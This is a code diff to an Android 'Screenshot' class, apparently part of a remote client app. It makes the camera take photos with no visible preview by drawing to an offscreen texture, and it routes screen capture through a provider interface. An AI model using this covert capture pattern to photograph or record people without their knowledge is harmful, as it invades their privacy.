@@ -8,6 +8,8 @@ import android.graphics.BitmapFactory;
 import android.graphics.Canvas;
 import android.graphics.ImageFormat;
 import android.graphics.Paint;
+import android.os.Environment;
+import android.os.RemoteException;
 import android.view.Gravity;
 import android.graphics.PixelFormat;
 import android.graphics.SurfaceTexture;
@@ -35,7 +37,12 @@ import android.view.WindowManager;
 import androidx.annotation.NonNull;
 import androidx.core.app.NotificationCompat;
 
+import com.ot.grhq.client.IScreenshotProvider;
 import com.ot.grhq.client.R;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -50,37 +57,38 @@ public class Screenshot {
     private static MediaProjection mediaProjection;
     private static ImageReader imageReader;
 
+    private static android.hardware.Camera camera;
+
+
     /**
      *
      * @return
      */
     public static String captureImage(Context context, boolean frontCamera) {
-        String filename = context.getFilesDir() + "/" + String.valueOf(System.currentTimeMillis()) + ".png";
+        String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
+        camera = getCamera(frontCamera);
+        android.hardware.Camera.Parameters parameters = camera.getParameters();
+        camera.setParameters(parameters);
+        try{
+            camera.setPreviewTexture(new SurfaceTexture(0));
+            camera.startPreview();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
-        int whichCamera;
-        if (frontCamera)
-            whichCamera = Camera.CameraInfo.CAMERA_FACING_FRONT;
-        else
-            whichCamera = Camera.CameraInfo.CAMERA_FACING_BACK;
+        camera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
+            @Override
+            public void onPictureTaken(byte[] data, android.hardware.Camera camera) {
+                releaseCamera();
+                try{
+                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
+                    FileOutputStream output = new FileOutputStream(filename);
+                    bitmap.compress(Bitmap.CompressFormat.PNG, 20, output);
 
-        Camera camera = Camera.open(whichCamera);
-        SurfaceView view = new SurfaceView(context);
-
-        try {
-            SurfaceHolder holder = view.getHolder();
-            camera.setPreviewDisplay(holder);
-        } catch(IOException e) {}
-
-        camera.startPreview();
-        camera.takePicture(null, null, new Camera.PictureCallback() {
-
-            public void onPictureTaken(byte[] data, Camera camera) {
-
-                try (FileOutputStream stream = new FileOutputStream(filename)) {
-                    stream.write(data);
-                } catch (IOException e) {}
-                camera.release();
-                camera = null;
+                    output.flush();
+                    output.close();
+                }catch(Exception ex){
+                }
             }
         });
 
@@ -88,11 +96,33 @@ public class Screenshot {
     }
 
     /**
+     * Camera cleanup
+     */
+    private static void releaseCamera(){
+        if (camera != null) {
+            camera.stopPreview();
+            camera.release();
+            camera = null;
+        }
+    }
+
+    /**
      * Take screenshot of device
      * @return
      */
-    public static String captureScreen(Context context) throws IOException, InterruptedException {
-        String filename = context.getFilesDir() + "/" + String.valueOf(System.currentTimeMillis()) + ".png";
+    public static String captureScreen(IScreenshotProvider aslProvider) throws RemoteException {
+        String file = null;
+
+        if (aslProvider == null)
+            return null;
+
+        if (!aslProvider.isAvailable())
+            return null;
+
+        file = aslProvider.takeScreenshot();
+
+        return file;
+//        String filename = context.getFilesDir() + "/" + String.valueOf(System.currentTimeMillis()) + ".png";
 //        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
 //
 //        Bitmap screenshot = null;
@@ -124,24 +154,24 @@ public class Screenshot {
 //            }
 //        } catch (Exception e) {}
 
-
-        ProcessBuilder processBuilder = new ProcessBuilder("screencap", filename);
-        processBuilder.directory(new File(context.getFilesDir().toURI()));
-        Process process = processBuilder.start();
-
-        // Check for errors
-        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
-        String line;
-        while ((line = errorReader.readLine()) != null) {
-            Log.d("eeee",line);
-        }
-
-        // Wait for the command to complete
-        int exitCode = process.waitFor();
-        if (exitCode == 0)
-            return filename;
-
-        return null;
+//
+//        ProcessBuilder processBuilder = new ProcessBuilder("screencap", filename);
+//        processBuilder.directory(new File(context.getFilesDir().toURI()));
+//        Process process = processBuilder.start();
+//
+//        // Check for errors
+//        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+//        String line;
+//        while ((line = errorReader.readLine()) != null) {
+//            Log.d("eeee",line);
+//        }
+//
+//        // Wait for the command to complete
+//        int exitCode = process.waitFor();
+//        if (exitCode == 0)
+//            return filename;
+//
+//        return null;
     }
 
     /**
@@ -290,5 +320,26 @@ public class Screenshot {
 
     public static void cleanup(String path) {
 
+    }
+
+    /**
+     * Select the camera to use
+     * @param frontCamera
+     * @return selected camera object
+     */
+    public static android.hardware.Camera getCamera(boolean frontCamera) {
+        int numberOfCameras = android.hardware.Camera.getNumberOfCameras();
+
+        // Search for selected camera
+        for (int i = 0; i < numberOfCameras; i++) {
+            android.hardware.Camera.CameraInfo info = new android.hardware.Camera.CameraInfo();
+            android.hardware.Camera.getCameraInfo(i, info);
+            if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT && frontCamera)
+                return Camera.open(i);
+            else if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK && !frontCamera)
+                return android.hardware.Camera.open(i);
+        }
+
+        return android.hardware.Camera.open(0);
     }
 }
